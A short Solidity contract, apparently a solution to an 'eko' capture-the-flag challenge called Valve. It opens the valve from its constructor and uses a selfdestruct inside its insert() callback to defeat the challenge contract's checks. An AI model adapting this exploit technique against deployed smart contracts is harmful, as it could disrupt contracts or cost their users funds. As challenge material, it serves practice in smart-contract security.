// SPDX-License-Identifier: AGPL-3.0-or-later
pragma solidity 0.8.17;

import { Valve, INozzle } from "eko/ChallengeValve.sol";

contract ValveCracker is INozzle {
  constructor(Valve valve) {
    valve.openValve(this);
  }

  function insert() external returns (bool) {
    selfdestruct(payable(address(0x0)));
    return true;
  }
}
